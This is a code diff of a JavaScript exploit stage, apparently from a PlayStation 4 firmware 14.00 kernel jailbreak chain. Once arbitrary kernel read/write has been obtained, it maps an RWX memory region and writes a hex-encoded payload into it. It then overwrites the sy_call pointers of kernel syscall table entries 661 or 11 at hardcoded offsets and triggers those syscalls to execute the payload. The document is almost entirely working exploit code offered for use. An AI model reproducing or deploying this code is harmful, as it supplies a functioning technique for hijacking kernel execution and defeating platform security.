@@ -247,78 +247,133 @@ export async function runKevent(c) {
   STATE.rwReady = true;
   log("STAGE3-RW", "*** ARBITRARY KERNEL R/W ESTABLISHED ***");
 
-  // --- STAGE 4: MAP PAYLOAD + HIJACK SYSENT ---
-  
+  // --- STAGE 4: MAP NEW PAYLOAD + HIJACK ---
   const payloadParam = c.params.get("payload");
   const payloadAddr = payloadParam ? BigInt(payloadParam) : 0x2002bc000n;
   STATE.payloadAddr = payloadAddr;
-  log("STAGE4-PAYLOAD", "target address=" + h16(payloadAddr));
+  log("STAGE4-PAYLOAD-ADDR", h16(payloadAddr));
 
-  // Known 14.00 SYSENT base (from Scene-Collective/ps4-hen offsets/1400.h)
+  // MAP NEW PAYLOAD (or reuse if already mapped)
+  const payloadSize = 0x40000;
+  let mappedAddr = 0n;
+
+  // Try mmap at fixed address with RWX
+  try {
+    const mrf = scn64("mmap", payloadAddr, payloadSize, 7, 0x12, -1, 0);
+    const got = (BigInt(mrf.hi >>> 0) << 32n) | BigInt(mrf.lo >>> 0);
+    if (got === payloadAddr) {
+      mappedAddr = got;
+      log("STAGE4-MAP-FIXED", "mapped RWX at " + h16(got));
+    } else {
+      // Fixed failed, try floating
+      const m = scn64("mmap", 0, payloadSize, 7, 0x1002, -1, 0);
+      mappedAddr = (BigInt(m.hi >>> 0) << 32n) | BigInt(m.lo >>> 0);
+      log("STAGE4-MAP-FLOAT", "mapped RWX at " + h16(mappedAddr) + " (fixed refused)");
+    }
+  } catch (e) {
+    log("STAGE4-MAP-FAIL", e.message);
+    fin("cannot map payload");
+  }
+
+  if (mappedAddr < 0x10000n) fin("mmap returned invalid address");
+
+  // Write payload bytes (T.PKB is hex-encoded)
+  log("STAGE4-WRITE", "writing PKB to " + h16(mappedAddr));
+  const pkbLen = T.PKB.length;
+  let written = 0;
+  for (let i = 0; i + 1 < pkbLen; i += 2) {
+    const hi = parseInt(T.PKB[i], 16);
+    const lo = parseInt(T.PKB[i+1], 16);
+    const byte = (hi << 4) | lo;
+    p.write1(toI64(mappedAddr + BigInt(written)), byte);
+    written++;
+  }
+  log("STAGE4-WRITE-DONE", "wrote " + written + " bytes");
+
+  // Verify payload
+  try {
+    const firstFour = p.read4(toI64(mappedAddr));
+    log("STAGE4-PAYLOAD-CHECK", "first 4 bytes = 0x" + (firstFour >>> 0).toString(16));
+    if (firstFour === 0) {
+      log("STAGE4-ABORT", "payload is all zeros — something went wrong");
+      fin("payload invalid");
+    }
+  } catch (e) {
+    log("STAGE4-PAYLOAD-FAIL", e.message);
+    fin("cannot read payload");
+  }
+
+  // ** 2. Verify sysent table **
   const SYSENT_BASE_1400 = 0x1102B70n;
   const sysent661Addr = STATE.kbase + SYSENT_BASE_1400 + 661n * 0x30n + 8n;
   const sysent11Addr = STATE.kbase + SYSENT_BASE_1400 + 11n * 0x30n + 8n;
 
   log("STAGE4-SYSENT", "SYSENT base at " + h16(STATE.kbase + SYSENT_BASE_1400));
-  log("STAGE4-661", "sysent[661].sy_call=" + h16(sysent661Addr));
-  log("STAGE4-11", "sysent[11].sy_call=" + h16(sysent11Addr));
+  log("STAGE4-661", "sysent[661].sy_call at " + h16(sysent661Addr));
+  log("STAGE4-11", "sysent[11].sy_call at " + h16(sysent11Addr));
 
-  // Read current values
   let orig661, orig11;
   try {
     orig661 = p.read8(toI64(sysent661Addr));
     orig11 = p.read8(toI64(sysent11Addr));
-    log("STAGE4-ORIG", "sysent[661].sy_call=" + h16(orig661) + " sysent[11].sy_call=" + h16(orig11));
+    log("STAGE4-ORIG", "sysent[661]=" + h16(orig661) + " sysent[11]=" + h16(orig11));
+
+    if (orig661.hi >>> 0 !== 0xffffffff && orig661.lo !== 0n) {
+      log("STAGE4-SYSENT-INVALID", "sysent[661] is NOT a valid kernel pointer — offset wrong");
+      log("STAGE4-ABORT", "cannot proceed without correct SYSENT_BASE_1400");
+      fin("sysent table invalid");
+    }
+    if (orig661.hi >>> 0 === 0xffffffff) {
+      log("STAGE4-SYSENT-OK", "sysent[661].sy_call looks valid");
+    }
   } catch (e) {
     log("STAGE4-READ-FAIL", e.message);
-    fin("Failed to read sysent table");
+    fin("failed to read sysent table");
   }
 
-  // --- TRY sysent[661] ---
-  log("STAGE4-661-HIJACK", "writing " + h16(payloadAddr) + " to sysent[661].sy_call");
-  p.write8(toI64(sysent661Addr), toI64(payloadAddr));
+  // ** 3. Try sysent[661] first **
+  log("STAGE4-661-HIJACK", "writing " + h16(mappedAddr) + " to sysent[661].sy_call");
+  p.write8(toI64(sysent661Addr), toI64(mappedAddr));
 
   const readback661 = p.read8(toI64(sysent661Addr));
-  if (readback661.low !== payloadAddr.low || readback661.hi !== payloadAddr.hi) {
-    log("STAGE4-661-FAIL", "hijack did not land: got=" + readback661);
+  if (readback661.low !== mappedAddr.low || readback661.hi !== mappedAddr.hi) {
+    log("STAGE4-661-FAIL", "hijack did not land: got=" + readback661 + " want=" + mappedAddr);
   } else {
-    log("STAGE4-661-VERIFIED", "sysent[661].sy_call now points at payload");
+    log("STAGE4-661-VERIFIED", "sysent[661].sy_call now points at " + h16(mappedAddr));
     log("STAGE4-661-TRIGGER", "calling syscall(661)...");
     try {
       const ret = scn(661);
-      log("STAGE4-661-TRIGGER-RETURNED", "ret=" + ret);
+      log("STAGE4-661-RETURNED", "ret=" + ret);
       p.write8(toI64(sysent661Addr), orig661);
-      log("STAGE4-DONE", "sysent[661] payload executed successfully");
-      fin("Stage 4 Complete via sysent[661].");
+      log("STAGE4-DONE", "payload executed successfully via sysent[661]");
+      fin("Stage 4 Complete.");
       return;
     } catch (e) {
-      log("STAGE4-661-TRIGGER-THREW", e.message);
+      log("STAGE4-661-THREW", e.message);
       p.write8(toI64(sysent661Addr), orig661);
     }
   }
 
-  // --- FALLBACK sysent[11] ---
-  log("STAGE4-11-HIJACK", "writing " + h16(payloadAddr) + " to sysent[11].sy_call");
-  p.write8(toI64(sysent11Addr), toI64(payloadAddr));
+  // ** 4. Fallback sysent[11] **
+  log("STAGE4-11-HIJACK", "writing " + h16(mappedAddr) + " to sysent[11].sy_call");
+  p.write8(toI64(sysent11Addr), toI64(mappedAddr));
 
   const readback11 = p.read8(toI64(sysent11Addr));
-  if (readback11.low !== payloadAddr.low || readback11.hi !== payloadAddr.hi) {
+  if (readback11.low !== mappedAddr.low || readback11.hi !== mappedAddr.hi) {
     log("STAGE4-11-FAIL", "hijack did not land: got=" + readback11);
     fin("Both 661 and 11 failed.");
   }
-  log("STAGE4-11-VERIFIED", "sysent[11].sy_call now points at payload");
+  log("STAGE4-11-VERIFIED", "sysent[11].sy_call now points at " + h16(mappedAddr));
 
   log("STAGE4-11-TRIGGER", "calling syscall(11)...");
   try {
     const ret = scn(11);
-    log("STAGE4-11-TRIGGER-RETURNED", "ret=" + ret);
+    log("STAGE4-11-RETURNED", "ret=" + ret);
   } catch (e) {
-    log("STAGE4-11-TRIGGER-THREW", e.message);
+    log("STAGE4-11-THREW", e.message);
   }
 
   p.write8(toI64(sysent11Addr), orig11);
-  log("STAGE4-RESTORE", "restored");
-
-  log("STAGE4-DONE", "payload execution attempted at " + h16(payloadAddr));
+  log("STAGE4-DONE", "payload execution attempted");
   fin("Stage 4 Complete.");
 }
